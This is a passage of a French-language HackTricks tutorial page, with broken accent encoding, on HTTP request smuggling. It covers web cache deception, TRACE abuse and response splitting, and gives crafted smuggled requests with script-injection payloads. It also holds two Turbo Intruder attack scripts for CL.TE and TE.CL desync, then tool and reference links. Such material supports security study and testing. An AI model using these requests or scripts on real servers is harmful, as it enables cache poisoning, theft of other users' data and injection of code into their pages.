### Utilisation du dÃ©tournement de requÃªte HTTP pour effectuer une tromperie de cache web <a href="#using-http-request-smuggling-to-perform-web-cache-deception" id="using-http-request-smuggling-to-perform-web-cache-deception"></a>

> **Quelle est la diffÃ©rence entre l'empoisonnement de cache web et la tromperie de cache web ?**
>
> * Dans l'**empoisonnement de cache web**, l'attaquant amÃ¨ne l'application Ã  stocker un contenu malveillant dans le cache, et ce contenu est servi Ã  partir du cache aux autres utilisateurs de l'application.
> * Dans la **tromperie de cache web**, l'attaquant amÃ¨ne l'application Ã  stocker un contenu sensible appartenant Ã  un autre utilisateur dans le cache, puis l'attaquant rÃ©cupÃ¨re ce contenu Ã  partir du cache.

L'attaquant crÃ©e une requÃªte dissimulÃ©e qui rÃ©cupÃ¨re un contenu sensible spÃ©cifique Ã  l'utilisateur. ConsidÃ©rez l'exemple suivant:
```markdown
`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Connection: keep-alive`\
`Content-Length: 43`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /private/messages HTTP/1.1`\
`Foo: X`
```
Si cette requÃªte de contrebande empoisonne une entrÃ©e de cache destinÃ©e Ã  un contenu statique (par exemple, `/someimage.png`), les donnÃ©es sensibles de la victime provenant de `/private/messages` pourraient Ãªtre mises en cache sous l'entrÃ©e de cache du contenu statique. Par consÃ©quent, l'attaquant pourrait potentiellement rÃ©cupÃ©rer ces donnÃ©es sensibles mises en cache.

### Abus de TRACE via la contrebande de requÃªtes HTTP <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

[**Dans cet article**](https://portswigger.net/research/trace-desync-attack), il est suggÃ©rÃ© que si le serveur a la mÃ©thode TRACE activÃ©e, il pourrait Ãªtre possible de l'exploiter avec une contrebande de requÃªtes HTTP. Cela est dÃ» au fait que cette mÃ©thode reflÃ©tera tout en-tÃªte envoyÃ© au serveur en tant que partie du corps de la rÃ©ponse. Par exemple:
```
TRACE / HTTP/1.1
Host: example.com
XSS: <script>alert("TRACE")</script>
```
Va envoyer une rÃ©ponse comme suit :
```
HTTP/1.1 200 OK
Content-Type: message/http
Content-Length: 115

TRACE / HTTP/1.1
Host: vulnerable.com
XSS: <script>alert("TRACE")</script>
X-Forwarded-For: xxx.xxx.xxx.xxx
```
Un exemple de l'abus de ce comportement serait de **faire passer d'abord une requÃªte HEAD**. Cette requÃªte recevra uniquement les **en-tÃªtes** d'une requÃªte GET (**`Content-Type`** parmi eux). Et faire passer **immÃ©diatement aprÃ¨s le HEAD une requÃªte TRACE**, qui va **reflÃ©ter les donnÃ©es envoyÃ©es**.\
Comme la rÃ©ponse HEAD contiendra un en-tÃªte `Content-Length`, la **rÃ©ponse de la requÃªte TRACE sera traitÃ©e comme le corps de la rÃ©ponse HEAD, reflÃ©tant ainsi des donnÃ©es arbitraires** dans la rÃ©ponse. \
Cette rÃ©ponse sera envoyÃ©e Ã  la prochaine requÃªte sur la connexion, ce qui pourrait Ãªtre **utilisÃ© dans un fichier JS mis en cache par exemple pour injecter du code JS arbitraire**.

### Abus de TRACE via le fractionnement de la rÃ©ponse HTTP <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

Continuer Ã  suivre [**cet article**](https://portswigger.net/research/trace-desync-attack) suggÃ¨re une autre faÃ§on d'abuser de la mÃ©thode TRACE. Comme commentÃ©, en faisant passer une requÃªte HEAD et une requÃªte TRACE, il est possible de **contrÃ´ler certaines donnÃ©es rÃ©flÃ©chies** dans la rÃ©ponse Ã  la requÃªte HEAD. La longueur du corps de la requÃªte HEAD est essentiellement indiquÃ©e dans l'en-tÃªte Content-Length et est formÃ©e par la rÃ©ponse Ã  la requÃªte TRACE.

Par consÃ©quent, la nouvelle idÃ©e serait que, en connaissant ce Content-Length et les donnÃ©es donnÃ©es dans la rÃ©ponse TRACE, il est possible de faire en sorte que la rÃ©ponse TRACE contienne une rÃ©ponse HTTP valide aprÃ¨s le dernier octet du Content-Length, permettant Ã  un attaquant de contrÃ´ler complÃ¨tement la requÃªte vers la prochaine rÃ©ponse (qui pourrait Ãªtre utilisÃ©e pour effectuer un empoisonnement de cache).

Exemple:
```
GET / HTTP/1.1
Host: example.com
Content-Length: 360

HEAD /smuggled HTTP/1.1
Host: example.com

POST /reflect HTTP/1.1
Host: example.com

SOME_PADDINGXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXHTTP/1.1 200 Ok\r\n
Content-Type: text/html\r\n
Cache-Control: max-age=1000000\r\n
Content-Length: 44\r\n
\r\n
<script>alert("response splitting")</script>
```
Les rÃ©ponses suivantes seront gÃ©nÃ©rÃ©es (notez comment la rÃ©ponse HEAD a une Content-Length rendant la rÃ©ponse TRACE partie du corps HEAD et une fois que la Content-Length de HEAD se termine, une rÃ©ponse HTTP valide est contrebandÃ©e) :
```
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 0

HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 165

HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: 243

SOME_PADDINGXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXHTTP/1.1 200 Ok
Content-Type: text/html
Cache-Control: max-age=1000000
Content-Length: 50

<script>alert(â€œarbitrary responseâ€)</script>
```
### Armes HTTP Request Smuggling avec DÃ©synchronisation des RÃ©ponses HTTP

Avez-vous trouvÃ© une vulnÃ©rabilitÃ© de HTTP Request Smuggling et vous ne savez pas comment l'exploiter ? Essayez cette autre mÃ©thode d'exploitation :

{% content-ref url="../http-response-smuggling-desync.md" %}
[http-response-smuggling-desync.md](../http-response-smuggling-desync.md)
{% endcontent-ref %}

### Autres Techniques de HTTP Request Smuggling

* HTTP Request Smuggling du Navigateur (CÃ´tÃ© Client)

{% content-ref url="browser-http-request-smuggling.md" %}
[browser-http-request-smuggling.md](browser-http-request-smuggling.md)
{% endcontent-ref %}

* Smuggling de RequÃªtes dans les DÃ©classements HTTP/2

{% content-ref url="request-smuggling-in-http-2-downgrades.md" %}
[request-smuggling-in-http-2-downgrades.md](request-smuggling-in-http-2-downgrades.md)
{% endcontent-ref %}

## Scripts Turbo Intruder

### CL.TE

Depuis [https://hipotermia.pw/bb/http-desync-idor](https://hipotermia.pw/bb/http-desync-idor)
```python
def queueRequests(target, wordlists):

engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Transfer-Encoding: chunked
Host: xxx.com
Content-Length: 35
Foo: bar

0

GET /admin7 HTTP/1.1
X-Foo: k'''

engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)

def handleResponse(req, interesting):
table.add(req)
```
### TE.CL

De : [https://hipotermia.pw/bb/http-desync-account-takeover](https://hipotermia.pw/bb/http-desync-account-takeover)
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Host: xxx.com
Content-Length: 4
Transfer-Encoding : chunked

46
POST /nothing HTTP/1.1
Host: xxx.com
Content-Length: 15

kk
0

'''
engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)


def handleResponse(req, interesting):
table.add(req)
```
## Outils

* [https://github.com/anshumanpattnaik/http-request-smuggling](https://github.com/anshumanpattnaik/http-request-smuggling)
* [https://github.com/PortSwigger/http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler)
* [https://github.com/gwen001/pentest-tools/blob/master/smuggler.py](https://github.com/gwen001/pentest-tools/blob/master/smuggler.py)
* [https://github.com/defparam/smuggler](https://github.com/defparam/smuggler)
* [https://github.com/Moopinger/smugglefuzz](https://github.com/Moopinger/smugglefuzz)
* [https://github.com/bahruzjabiyev/t-reqs-http-fuzzer](https://github.com/bahruzjabiyev/t-reqs-http-fuzzer): Cet outil est un Fuzzer HTTP basÃ© sur la grammaire utile pour trouver des incohÃ©rences Ã©tranges de trafic de requÃªtes.

## RÃ©fÃ©rences

* [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
* [https://portswigger.net/web-security/request-smuggling/finding](https://portswigger.net/web-security/request-smuggling/finding)
* [https://portswigger.net/web-security/request-smuggling/exploiting](https://portswigger.net/web-security/request-smuggling/exploiting)
* [https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4](https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4)
* [https://github.com/haroonawanofficial/HTTP-Desync-Attack/](https://github.com/haroonawanofficial/HTTP-Desync-Attack/)
* [https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html](https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html)
* [https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/](https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/)
* [https://portswigger.net/research/trace-desync-attack](https://portswigger.net/research/trace-desync-attack)

<details>

<summary><strong>Apprenez le piratage AWS de zÃ©ro Ã  hÃ©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres faÃ§ons de soutenir HackTricks:

* Si vous souhaitez voir votre **entreprise annoncÃ©e dans HackTricks** ou **tÃ©lÃ©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* DÃ©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** ğŸ’¬ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
